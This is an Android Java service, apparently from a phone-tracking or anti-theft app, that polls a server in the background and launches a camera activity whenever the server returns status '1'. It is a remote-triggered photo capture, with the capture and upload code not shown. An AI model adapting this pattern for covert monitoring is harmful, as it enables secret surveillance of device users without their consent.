/**
 * Copyright OCTAL INFO SOLUTIONS PVT LTD.  4:53:43 PM  Jul 10, 2013
 */
package com.hinj.secure.smsgps;

import java.util.Timer;
import java.util.TimerTask;

import android.app.Service;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Handler;
import android.os.IBinder;

import com.hinj.app.utils.Utility;
import com.hinj.parsing.HingAppParsing;

public class CheckCameraCaptureStatusBackgroundService extends Service {
	
	private static final String TAG = "CheckCameraCaptureStatusBackgroundService";
	private TimerTask mBackgroundServiceTask;
	private Handler mHandler;
	private Timer mBackgroundServiceTimer;
	private String clip_board_string = "";

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public void onCreate() {
		mHandler=new Handler();
	}
	
	public int onStartCommand(Intent intent, int flags, int startId) {
		
		mBackgroundServiceTask = new TimerTask() {
			public void run() {
				mHandler.post(new Runnable() {
					@Override
					public void run() {
						if (true) {
								try {	
									if(Utility.isNetworkAvailable(CheckCameraCaptureStatusBackgroundService.this)){
										new GetCameraCaptureAsynctask().execute();
									}
								} catch (Exception e) {
									e.printStackTrace();
							}
						}
					}
				});
			}
		};
		mBackgroundServiceTimer = new Timer();		
		mBackgroundServiceTimer.schedule(mBackgroundServiceTask, 1);
		return START_STICKY;
	}
	
	public class GetCameraCaptureAsynctask extends AsyncTask<String, String, Object[]> {

		@Override
		public void onPreExecute() {
		}

		@Override
		public Object[] doInBackground(String... params) {

			return HingAppParsing.getCameraCapture(CheckCameraCaptureStatusBackgroundService.this);
		}

		@Override
		public void onPostExecute(Object[] result) {
			
			System.out.println(result);
			
			String status = (String) result[1];
			if(status.equalsIgnoreCase("1"))
			{
				takePic();
			}
		}
	}
	
	public void takePic() {

		Intent dialogIntent = new Intent(CheckCameraCaptureStatusBackgroundService.this, CallCamera.class);
		dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION);
		CheckCameraCaptureStatusBackgroundService.this.startActivity(dialogIntent);

	}
}
